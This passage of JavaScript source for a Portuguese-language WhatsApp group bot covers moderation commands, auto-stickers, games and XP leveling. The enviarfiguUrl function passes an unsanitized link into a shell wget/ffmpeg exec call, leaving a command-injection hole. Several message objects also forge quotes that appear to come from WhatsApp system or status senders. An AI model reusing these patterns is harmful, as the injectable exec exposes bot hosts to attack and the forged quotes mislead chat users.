var tempo = 'Boa tarde'
}
if(time2 > "19:00:00"){
var tempo = 'Boa noite'
}



//========REPLY========================

const sasah = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "557999398421-1625944593@g.us" } : {}) }, message: { "liveLocationMessage": { "caption": `${tempo} ${pushname} ✨` } } }

const selo3 = { key: {participant: `0@s.whatsapp.net`, ...(m.from ?{ remoteJid: `${m.from}` } : {}) },message: { "extendedTextMessage": {"text":`aqui está ${pushname} 🌹` }} }       

const selo2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;NEZUKO,;;;\nFN:NEZUKO,\nitem1.TEL;waid= "./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg":"./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg"\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`funções de cmd/mídia-ft-vd/fotos/nezuko.jpg`), thumbnail:fs.readFileSync(`funções de cmd/mídia-ft-vd/fotos/nezuko.jpg`),sendEphemeral: true}}}

const dnselo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ... { remoteJid: "status@broadcast" } }, message: { "imageMessage": { "caption": `ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿`, } } }

const Nakatin2 ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 777,status: 200, thumbnail: await reSize(logo2, 100, 100), surface: 200, message: `${NomeDoBot}`, orderTitle: 'Yajiir', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}

const dnz = {key : {participant : '0@s.whatsapp.net'},message: {contactMessage:{displayName: `${pushname}`}}}
const selo4 = {"key": {"fromMe": false,"participant":"0@s.whatsapp.net", "remoteJid": "557598293339@g.us" }, "message": {orderMessage: {itemCount: 0,status: 4, thumbnail: fs.readFileSync(`./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg`) ,message: `Nick : ${pushname}`,surface: 100, sellerJid: "0@s.whatsapp.net"}}}
const dev = { key: {participant: `0@s.whatsapp.net`, mentionedJid: `Dacoro`, ...(m.from ?{ remoteJid: `${m.from}` } : {}) },message: { "extendedTextMessage": {"text":`𝑫𝒏 𝑵𝒐 𝑪𝒐𝒏𝒕𝒓𝒐𝒍𝒆 😈` }} }       

const reply = (texto) => {
nezuko.sendMessage(from, { text: texto }, {quoted:m}).catch(e => {
console.log(e)
})
}

//=====================================
     
nezuko.createMessage = async (jidnya, kontennya, optionnya) => {
return await generateWAMessage(jidnya, kontennya, {...optionnya,userJid: nezuko.authState.creds.me.id,upload: nezuko.waUploadToServer})
}

//=====================================


function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}


//=============DATA=============

const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

//=====================================


//=====================================
const tipoMensagem = type == 'audioMessage' ? 'Áudio' : type == 'stickerMessage' ? 'Figurinha' : type == 'imageMessage' ? 'Imagem' : type == 'videoMessage' ? 'Vídeo' : type == 'documentMessage' ? 'Documento' : type == 'contactMessage' ? 'Contato' : type == 'locationMessage' ? 'Localização' : 'Mensagem'

// Designer do Termux:
  if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m COMANDO \x1b[1;37m]', color(command, "yellow"), 'do', color(pushname, "yellow"), 'Horas:', color(time, "yellow"));
  if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m COMANDO \x1b[1;37m]', color(command, "yellow"), 'do', color(pushname, "yellow"), 'Grupo:', color(groupName, "yellow"), 'Horas:', color(time, "yellow"));
 if (!isCmd && isGroup && !info.key.fromMe) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m MENSAGEM \x1b[1;37m]', color(tipoMensagem, "yellow"), 'do', color(pushname, "yellow"), 'Grupo:', color(groupName, "yellow"), 'Horas:', color(time, "yellow"));
  if (!isGroup && !isCmd && !info.key.fromMe) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m MENSAGEM \x1b[1;37m]', color(tipoMensagem, "yellow"), 'do', color(pushname, "yellow"), 'Horas:', color(time, "yellow"));
		



//===================================== 

//=====================================\\

//=====================================


//===========(enviar.espere)=============\\

const { mensagens } = require('./funções de cmd/funções/aleatoria.js');

const { sortear } = require('./funções de cmd/funções/aleatoria.js');

var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)] 
//========================================\\


//=====================================

enviar = {
espere: `${enviarmen}`,
successo: '️❬ ✔ ❭ Sucesso 🖤',
levelon: '❬ ✔ ❭ *leveling* *ativado*',
leveloff: '❬ X ❭  *leveling* *desativado*',
levelnoton: '❬ X ❭ *leveling não ativado*',
levelnol: '*error* 0 °-°',
error: {
stick: '*falhou, tente novamente',
Iv: 'Link invalido ☹️'
},
msg: {
grupo: '<❗> Este comando só pode ser utilizado em grupo.',
premium: '<❗> Este pedido é so para usuários premium.',
mod: `<❗> ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD ${global.NickDono}*`,
banido: '<❗> Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque.' ,
donosmt: '<❗> Este é um recurso especial para o meu Mestre.',
donosmt2: '<❗> Este é um recurso especial para o meu Mestre.',
adm: '<❗> Este comando só pode ser usado por administradores do grupo.',
Badmin: '<❗> Este comando só pode ser usado quando o bot se tornar administrador.',
}
}
//=====================================

const sendBtext = async (id, text1, desc1, but = [], vr) => {
buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
nezuko.sendMessage(id, buttonMessage, {quoted: vr})
}

//=====================================


const enviarbutao = (from, text, footer, buttons) => {
return nezuko.sendMessage(from, { text: text, footer: footer, templateButtons: buttons, quoted: dnselo})
}    

//=====================================



const enviarimg = (imageDir, caption) => {
nezuko.sendMessage(from, {
image: fs.readFileSync(imageDir),
caption: caption
})
}

 
// ENVIAR BOTÃO COM IMAGEM
const sendBimg = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
buttons: but,
headerType: 4
}
nezuko.sendMessage(id, buttonMessage, {quoted: vr})
}
   

//========AUTOFIGU-GP/AUTOFIGU-PV=============

const enviarfigu = async (figu, tag) => {
bla = fs.readFileSync(figu)
nezuko.sendMessage(from, {sticker: bla}, {quoted: info})
}

const enviarfiguUrl = async (link) => {
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buff = fs.readFileSync(rano)
nezuko.sendMessage(from, {sticker: buff}, {quoted: info}).catch(e => {
})
fs.unlinkSync(rano)
})
}

budai = budy.toLowerCase()

if (budai.startsWith("nezuko ban")){
if(!SoDono) return reply(` Comando bloqueado por motivo de ban no número.`)
    if (!isGroup) return reply('Apenas em Grupo')
    if (!isBotGroupAdmins) return reply('O Bot não e admin')
    if (!isGroupAdmins) return reply('Você não e adm')
    testa = budai.replace("nezuko ban", "")
    let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : testa.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if(users === '@s.whatsapp.net') return reply('<❗> Marque alguem ou adicione um numero.')
    if (botNumber.includes(users)) return reply('<❗> Não sou besta de remover eu mesmo né.')
    if (numerodonos.includes(users)) return reply('<❗> Não posso remover meu Mestre')
    try {
        await nezuko.groupParticipantsUpdate(from, [users], 'remove')
        reply('<❗> Usuario banido com sucesso.')
    } catch { reply('<❗> Erro ao Remover Usuario do Grupo.') }
}
 if (budai.startsWith("nezuko reviver")){
 if(!SoDono) return reply(` Comando bloqueado por motivo de ban no número.`)
    if (!isGroup) return reply('Apenas em Grupo')
    if (!isBotGroupAdmins) return reply('O Bot não e admin')
    if (!isGroupAdmins) return reply('Você não e adm')
    testa = budai.replace("nezuko reviver", "")
   
    let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : testa.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if(users === '@s.whatsapp.net') return reply('Marque alguem ou adicione um numero.')
    try{
    await nezuko.groupParticipantsUpdate(from, [users], 'add')
    reply('Sucesso ao Reviver o Usuario')
    } catch {
        reply('Erro Ao Reviver o Usuario')
    }

}
if (budai.startsWith("nezuko promover")){
    if (!isGroup) return reply('Apenas em Grupo')
    if (!isBotGroupAdmins) return reply('O Bot não e admin')
    if (!isGroupAdmins) return reply('<❗> Você não é adm.')
    testa = budai.replace("nezuko promover", "")
   
    let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : testa.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if(users === '@s.whatsapp.net') return reply('<❗> Marque alguem ou adicione um numero.')
    try{
        await nezuko.groupParticipantsUpdate(from, [users], 'promote')
        reply('<❗> Sucesso ao Promover Usuario')
    } catch {
        reply('<❗> Erro Ao Promover o Usuario')
    }

}
if (budai.startsWith("nezuko rebaixar")){
    if (!isGroup) return reply('<❗> Apenas em Grupo.')
    if (!isBotGroupAdmins) return reply('<❗> O Bot não é adm.')
    if (!isGroupAdmins) return reply('<❗> Você não é adm')
    testa = budai.replace("nezuko rebaixar", "")
    let users = info.mentionedJid[0] ? info.mentionedJid[0] : info.quoted ? info.quoted.sender : testa.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if(users === '@s.whatsapp.net') return reply('<❗> Marque alguem ou adicione um numero.')
    if (botNumber.includes(users)) return reply('<❗> Não sou besta de rebaixar eu mesmo né.')
    if (numerodonos.includes(users)) return reply('<❗> Não posso rebaixar meu Mestre.')
    try {
        await nezuko.groupParticipantsUpdate(from, [users], 'demote')
        reply('[ ! ] Usuario Rebaixado com Sucesso.')
    } catch { reply('[ ! ] Erro ao Rebaixar Usuario no Grupo.') }
}

if(budai.startsWith("nezuko fechargp")){
    if (!isGroup) return reply('Apenas em Grupo')
    if (!isBotGroupAdmins) return reply('O Bot não e admin')
    if (!isGroupAdmins) return reply('Você não e adm')
            await nezuko.groupSettingUpdate(from, 'announcement')
}
 if(budai.startsWith("nezuko abrirgp")){
    if (!isGroup) return reply('<❗> Apenas em Grupo')
    if (!isBotGroupAdmins) return reply('<❗> O Bot não é adm.')
    if (!isGroupAdmins) return reply('<❗> Você não é adm.')
    await nezuko.groupSettingUpdate(from, 'not_announcement')
        
}

if(isAutoSticker &&  !m.key.fromMe && isGroup) {
async function autofiguf() {
await setTimeout(async() => {    

if(budy.includes(`${prefix}sticker`) || budy.includes(`${prefix}s`) || budy.includes(`${prefix}stk`) || budy.includes(`${prefix}st`) || budy.includes(`${prefix}fsticker`) || budy.includes(`${prefix}f`) || budy.includes(`${prefix}fstiker`)) return

if(type === "videoMessage") {
if ((isMedia && info.message.videoMessage.seconds < 20)){  
rane = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
buffimg = await getFileBuffer(info.message.videoMessage, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'manu')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
nezuko.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} 
}

if(type === "imageMessage") {
rane = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
buffimg = await getFileBuffer(info.message.imageMessage, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
nezuko.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})  
}
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}


//=====================================

/*
if (isAutoStick && isGroup) {
     if(type == "imageMessage") {
await nezuko.sendImageAsSticker(from, m,    {packname: global.packname, author: global.author })
console.log(`DETECTADO AUTOSTICKER `)
} else if(type == "videoMessage") {
await nezuko.sendVideoAsSticker(from, m,  {packname: global.packname, author: global.author })
}
}
*/

//=====================================
const GroupsMutedActived = []
for(let obj of muted) {
    GroupsMutedActived.push(obj.jid)
}
const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
if(isMuted && NumbersMuted.indexOf(sender) >= 0){
reply('*Eu avisei, vou meter o martelo do ban em tu 😡')
setTimeout(async () => {
    nezuko.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
return
}
//=====================================

if(isAutoReact && isGroup && isCmd) {
if(!isAutoReact) return 
emojis = ["😀", "😃", "😁", "😆", "😂", "🤣", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "😷", "☔", "👺", "👹", "💨", "😸", "😹", "☔", "🫀", "👁️", "🛑", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "🌈", "☔", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎗️", "📽️", "🎰", "☎️", "📞", "👑", "💎", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await nezuko.sendMessage(from, {react: {text: reassao, key: m.key}})
}

if(isAutoReact && isGroup && !isCmd) {
if(!isAutoReact) return 
emojis = ["😀", "😃", "😁", "😆", "😂", "🤣", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "😷", "☔", "👺", "👹", "💨", "😸", "😹", "☔", "🫀", "👁️", "🛑", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "🌈", "☔", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎗️", "📽️", "🎰", "☎️", "📞", "👑", "💎", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await nezuko.sendMessage(from, {react: {text: reassao, key: m.key}})
}


//=====================================

//////////_FUNÇÕES DO JOGO DA VELHA_//////
async function joguinhodavelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = body.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./funções de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (body == "Cex") return reply("why");
if (
body.toLowerCase() == "s" ||
body.toLowerCase() == "sim" ||
body.toLowerCase() == "ok"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./funções de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
 
Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
nezuko.sendMessage(from, {text: chatAccept}, {quoted: dnselo,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net", 
],
},
});
}
} else if (
body.toLowerCase() == "n" ||
body.toLowerCase() == "não" ||
body.toLowerCase() == "no"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo já começou!`);
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
 nezuko.sendMessage(from, {text:
 `@${boardnow.X} *_Infelizmente seu oponente não aceitou o desafio ❌😕_*`}, {quoted: dnselo,
 contextInfo: {
 mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return reply(`Parece que seu oponente não aceitou o desafio ainda...`)
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(body), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
Jogo termina empatado 😐
`;
reply(chatEqual);
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 10;
const limLoose = Math.floor(Math.random() * 1) + 5;
const chatWon = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
Vencido por @${winnerJID} 😎👑
`;
addLevelingXp(winnerJID + "@s.whatsapp.net", abt)

nezuko.sendMessage(from, {text: chatWon}, {quoted: dnselo,
contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
setTimeout( () => {
if (fs.existsSync("./funções de cmd/tictactoe/db/" + from + ".json")) {
 fs.unlinkSync("./funções de cmd/tictactoe/db/" + from + ".json");
 reply(`*🕹️JOGO DA VELHA RESETADO...🕹️*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('Jogo da velha espirado', "red"));
 }
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
reply(`_*🥳Parabéns @${winnerJID} Você ganhou "${abt}" em xp por ter ganhado o jogo da velha🎉...*_`)      
fs.unlinkSync(`./funções de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
  
❌ : @${moving.X}
⭕ : @${moving.O}

Sua vez : @${moving.turn == "X" ? moving.X : moving.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
nezuko.sendMessage(from, {text: chatMove}, {quoted: dnselo,
contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
} 
} 
}

//======================================\\

const sendStickerFromUrl = async(to, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './sticker' + names + '.png', async function () {
console.log('enviando sticker');
let filess = './sticker' + names + '.png'
let asw = './sticker' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
nezuko.sendMessage(to, {sticker: media}, {sendEphemeral: true, contextInfo: { forwardingScore: 50, isForwarded: true}, quoted: info})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}


//===================================\\

		//JOGO DO ANAGRAM
if(isGroup && fs.existsSync(`./funções de cmd/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('está perto')
xp = Math.floor(Math.random() * 14) + 3000
if(budy.toUpperCase() == dataAnagrama.original) { nezuko.sendMessage(from, {text: `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./funções de cmd/anagrama-${from}.json`)		
addLevelingXp(sender, xp)
recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp*`
reply(recompensa)
		setTimeout(async() => {
fs.writeFileSync(`./funções de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
nezuko.sendMessage(from, {text:`
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────
`}) 
}, 5000)
}}

//========================================\\

//======================================\\
//BAN CHATS/GRUPOS
if (isBanchat && !isGroupAdmins && !SoDono){
if (!isGroupAdmins && !SoDono) return
if (budy2.startsWith('unbangp')){
if (isCmd && !isBanchat && !isGroupAdmins) return reply(`Este grupo esta banido, ou seja não estou ouvindo ninguém`)
let lfd = bancht.indexOf(from)
bancht.splice(lfd, 1)
fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
reply(`Grupo desbanido...`)
}
}


//=======FUNCIONALIDADE PATENTE=========\\
const nivelAtual = getLevelingLevel(sender)
var patt = 'Bronze I 🎗️'
if (nivelAtual === 1) {patt = 'Bronze  I 🎗️' } else if (nivelAtual === 2) {patt = 'Bronze II 🎗️'} else if (nivelAtual === 3) {patt = 'Bronze  III '} else if (nivelAtual === 4) {patt = 'Bronze  IV  🎗️'} else if (nivelAtual === 5) {patt = 'Bronze  V 🎗️'} else if (nivelAtual === 6) {patt = 'Prata I🥈'} else if (nivelAtual === 7) {patt = 'Prata II🥈'} else if (nivelAtual === 8) {patt = 'Prata III🥈'} else if (nivelAtual === 9) {patt = 'Prata IV🥈'} else if (nivelAtual === 10) {patt = 'Prata V🥈'} else if (nivelAtual === 11) {patt = 'Ouro I🥇'} else if (nivelAtual === 12) {patt = 'Ouro II🥇'} else if (nivelAtual === 13) {patt = 'Ouro III🥇'} else if (nivelAtual === 14) {patt = 'Ouro IV🥇'} else if (nivelAtual === 15) {patt = 'Ouro V🥇'} else if (nivelAtual === 16) {patt = 'Campeão I🏆'} else if (nivelAtual === 17) {patt = 'Campeão II🏆'} else if (nivelAtual === 18) {patt = 'Campeão III🏆'} else if (nivelAtual === 19) {patt = 'Campeão IV🏆'} else if (nivelAtual === 20) {patt = 'Campeão V🏆'} else if (nivelAtual === 21) {patt = 'Diamante I 💎'} else if (nivelAtual === 22) {patt = 'Diamante II 💎'} else if (nivelAtual === 23) {patt = 'Diamante III 💎'} else if (nivelAtual === 24) {patt = 'Diamante IV 💎'} else if (nivelAtual === 25) {patt = 'Diamante V 💎'} else if (nivelAtual === 26) {patt = 'Mestre I 🐂'} else if (nivelAtual === 27) {patt = 'Mestre II 🐂'} else if (nivelAtual === 28) {patt = 'Mestre III 🐂'} else if (nivelAtual === 29) {patt = 'Mestre IV 🐂'} else if (nivelAtual === 30) {patt = 'Mestre V 🐂'} else if (nivelAtual === 31) {patt = 'Mítico I 🔮'} else if (nivelAtual === 32) {patt = 'Mítico II 🔮'} else if (nivelAtual === 33) {patt = 'Mítico III 🔮'} else if (nivelAtual === 34) {patt = 'Mítico IV 🔮'} else if (nivelAtual === 35) {patt = 'Mítico V 🔮'} else if (nivelAtual === 36) {patt = 'God I🕴'} else if (nivelAtual === 37) {patt = 'God II🕴'} else if (nivelAtual === 38) {patt = 'God III🕴'} else if (nivelAtual === 39) {patt = 'God IV🕴'} else if (nivelAtual === 40) {patt = 'God V🕴'} else if (nivelAtual > 41) {patt = '🛐Grande Mestre🛐'}
//========================================\\

//==========(FUNÇÃO DE LEVEL)=============\\
if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 10) + 500
const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
await reply(`╭━─━───[🌹️]────━─━╮
                 𝐏𝐀𝐑𝐀𝐁𝐄́𝐍𝐒 
╰━─━───[🌹️]────━─━╯

*[🏓] 𝐍𝐨𝐯𝐨 𝐧𝐢́𝐯𝐞𝐥 𝐚𝐥𝐜𝐚𝐧𝐜̧𝐚𝐝𝐨 [🏓]*

[🎴] 𝐜𝐡𝐚𝐭: ${sender.split("@")[0]}.           
[🔰️] 𝐩𝐚𝐭𝐞𝐧𝐭𝐞: ${patt}
[👥] 𝐱𝐩: ${getLevelingXp(sender)}
[⚙️] 𝐚𝐧𝐭𝐢𝐠𝐨: ${getLevel} 
[🎮] 𝐧𝐞𝐰 𝐥𝐞𝐯𝐞𝐥: ${getLevelingLevel(sender)}`)}
} catch (err) {
console.error(err)
